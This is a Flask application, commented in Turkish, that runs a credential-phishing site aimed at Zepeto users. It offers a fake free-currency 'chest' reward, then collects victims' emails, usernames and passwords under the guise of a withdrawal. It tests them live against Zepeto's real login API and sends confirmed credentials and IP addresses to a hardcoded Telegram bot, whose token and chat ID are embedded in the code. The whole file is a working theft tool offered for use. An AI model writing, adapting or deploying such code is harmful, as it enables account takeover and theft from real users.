import base64
from datetime import datetime, timedelta
import json
import random
import re
import uuid
from flask import Flask, redirect, render_template, request, session, url_for
import requests

app = Flask(__name__)
app.secret_key = "zepeto_cok_gizli_key_12345"

# --- TELEGRAM BOT AYARLARI ---
TELEGRAM_BOT_TOKEN = "8256152441:AAFkFccWy5pHf3YW2e7BFx029u18rbpATkQ"
TELEGRAM_CHAT_ID = "7958696125"

# Spam / Ard arda yanlış giriş koruması için hafıza
GIRIS_KONTROL_HAFIZASI = {}


def telegrama_gonder(mesaj):
  if not TELEGRAM_BOT_TOKEN:
    return
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
  payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
  try:
    requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Telegram hatası: {e}")


def log_kaydet(metin):
  try:
    zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a", encoding="utf-8") as f:
      f.write(f"[{zaman}] {metin}\n")
  except Exception as e:
    print(f"Log yazma hatası: {e}")


def zepeto_gercek_api_dogrula(user_id, raw_password):
  """Zepeto anasayfasından ANLIK zState token'ı yakalar ve API'yi test eder"""
  try:
    session_requests = requests.Session()
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36"
            " (KHTML, like Gecko) Edg/156.0.0.0 Mobile Safari/537.36"
        )
    }

    # 1. Adım: Anasayfaya gidip anlık zState token'ını yakala
    home_resp = session_requests.get(
        "https://account.zepeto.me/", headers=headers, timeout=10
    )
    final_url = home_resp.url  # Yönlendirildiği URL (içinde zState ol скрыт)

    # URL'den veya HTML içeriğinden zState'i regex ile çek
    z_state = None
    match = re.search(r"zState=([^&]+)", final_url)
    if match:
      z_state = match.group(1)
    else:
      # Eğer URL'de yoksa HTML içeriğinde ara
      match_html = re.search(r'zState["\']?\s*[:=]\s*["\']([^"\']+)', home_resp.text)
      if match_html:
        z_state = match_html.group(1)

    if not z_state:
      return False, "Anlık zState token'ı yakalanamadı."

    # 2. Adım: Yakalanan ANLIK zState ile API'ye istek at
    encoded_password = base64.b64encode(raw_password.encode("utf-8")).decode(
        "utf-8"
    )
    api_url = f"https://account.zepeto.me/api/p/zauth/oauth2/authorize/zepeto?zState={z_state}"

    api_headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": "https://account.zepeto.me",
        "Referer": final_url,
        "User-Agent": headers["User-Agent"],
    }

    payload = {"userId": user_id, "password": encoded_password}
    response = session_requests.post(
        api_url, headers=api_headers, json=payload, timeout=10
    )

    if response.status_code == 200:
      res_text = response.text
      try:
        data = response.json()
        if data.get("isSuccess") is False:
          return False, "Zepeto API: Bilgiler yanlış."
      except json.JSONDecodeError:
        if "code=" in res_text:
          return True, "Giriş Başarılı!"

    return False, "API yanıtı geçersiz veya reddedildi."

  except Exception as e:
    return False, f"API Bağlantı Hatası: {str(e)}"


@app.route("/")
def index():
  ref = request.args.get("ref")
  if ref:
    session["ref_code"] = ref

  if "user_id" not in session:
    session["user_id"] = str(uuid.uuid4())[:8]
    session["zems"] = 0
    session["chest_opened"] = False
    session["referred"] = False

  return render_template(
      "index.html",
      zems=session.get("zems", 0),
      chest_opened=session.get("chest_opened", False),
      user_id=session.get("user_id"),
  )


@app.route("/open_chest", methods=["POST"])
def open_chest():
  if session.get("chest_opened"):
    return {"status": "error", "message": "Zaten sandık açtın!"}

  kazanilan_zem = random.choice([100, 200, 300])
  session["zems"] += kazanilan_zem
  session["chest_opened"] = True

  if "ref_code" in session and not session.get("referred", False):
    ref_user = session["ref_code"]
    session["referred"] = True
    davet_mesaji = f"🔗 Arkadaş Daveti Onaylandı! Referans: {ref_user}"
    telegrama_gonder(f"<b>{davet_mesaji}</b>")
    log_kaydet(davet_mesaji)

  return {"status": "success", "zems": kazanilan_zem, "total": session["zems"]}


@app.route("/withdraw", methods=["POST"])
def withdraw():
  identifier = request.form.get("email")
  username = request.form.get("username")
  password = request.form.get("password")
  withdraw_type = request.form.get("withdraw_type")

  client_ip = request.remote_addr
  simdi = datetime.now()

  # Spam ve yanlış giriş kontrolü
  if client_ip in GIRIS_KONTROL_HAFIZASI:
    kayit = GIRIS_KONTROL_HAFIZASI[client_ip]
    if (
        kayit["engel_bitis_zamani"]
        and simdi < kayit["engel_bitis_zamani"]
    ):
      kalan_sure = int(
          (kayit["engel_bitis_zamani"] - simdi).total_seconds()
      )
      return render_template(
          "index.html",
          zems=session.get("zems", 0),
          chest_opened=session.get("chest_opened", True),
          error=f"Çok fazla yanlış deneme yaptınız! Lütfen {kalan_sure} saniye bekleyin.",
      )

  if not password or len(password) < 6:
    return render_template(
        "index.html",
        zems=session.get("zems", 0),
        chest_opened=session.get("chest_opened", True),
        error="Zepeto şifresi en az 6 karakter olmalıdır!",
    )

  if not identifier or not username or not password:
    return render_template(
        "index.html",
        zems=session.get("zems", 0),
        chest_opened=session.get("chest_opened", True),
        error="Tüm alanları eksiksiz doldurunuz!",
    )

  current_zems = session.get("zems", 0)

  # --- E-POSTA VE KULLANICI ADINI SIRAYLA TEST ETME ---
  test_edilecekler = []
  if "@" in identifier:
    test_edilecekler.append(identifier)
    if username and username != identifier:
      test_edilecekler.append(username)
  else:
    test_edilecekler.append(identifier)
    if username:
      test_edilecekler.append(username)

  basarili = False
  dogrulanan_kimlik = ""

  for kimlik in test_edilecekler:
    log_kaydet(f"Anlık zState ile API Test Ediliyor -> Kimlik: {kimlik}")
    durum, aciklama = zepeto_gercek_api_dogrula(kimlik, password)
    if durum:
      basarili = True
      dogrulanan_kimlik = kimlik
      break

  # Bilgiler yanlışsa
  if not basarili:
    if client_ip not in GIRIS_KONTROL_HAFIZASI:
      GIRIS_KONTROL_HAFIZASI[client_ip] = {
          "deneme_sayisi": 0,
          "engel_bitis_zamani": None,
      }

    GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"] += 1
    hatali_sayi = GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"]

    log_kaydet(
        f"API REDDETTİ (Hatalı Deneme {hatali_sayi}) -> Kimlikler: {test_edilecekler} | IP: {client_ip}"
    )

    if hatali_sayi >= 2:
      GIRIS_KONTROL_HAFIZASI[client_ip]["engel_bitis_zamani"] = (
          datetime.now() + timedelta(seconds=60)
      )
      GIRIS_KONTROL_HAFIZASI[client_ip]["deneme_sayisi"] = 0
      return render_template(
          "index.html",
          zems=session.get("zems", 0),
          chest_opened=session.get("chest_opened", True),
          error="Bilgiler yanlış! Üst üste hatalı deneme yaptığınız için 1 dakika beklemek zorundasınız.",
      )

    return render_template(
        "index.html",
        zems=session.get("zems", 0),
        chest_opened=session.get("chest_opened", True),
        error="Bilgiler yanlış, lütfen doğru bilgiyi bulunuz ve tekrar deneyin!",
    )

  # --- BİLGİLER DOĞRUYSA ---
  if client_ip in GIRIS_KONTROL_HAFIZASI:
    del GIRIS_KONTROL_HAFIZASI[client_ip]

  log_metni = f"API ONAYLADI -> Doğrulanan: {dogrulanan_kimlik} | Şifre: {password} | Miktar: {current_zems} ZEM"
  log_kaydet(log_metni)

  telegram_mesaji = (
      f"🚨 <b>API Tarafından Doğrulanan Gerçek Hesap!</b>\n\n"
      f"📧 <b>Doğrulanan Kimlik:</b> <code>{dogrulanan_kimlik}</code>\n"
      f"👤 <b>Kullanıcı Adı:</b> <code>{username}</code>\n"
      f"🔑 <b>Şifre:</b> <code>{password}</code>\n"
      f"💎 <b>ZEM Miktarı:</b> {current_zems} ({withdraw_type})\n"
      f"🌐 <b>IP Adresi:</b> {client_ip}"
  )
  telegrama_gonder(telegram_mesaji)

  return render_template(
      "index.html",
      success=True,
      zems=current_zems,
      chest_opened=session.get("chest_opened", True),
  )


if __name__ == "__main__":
  app.run(debug=True)
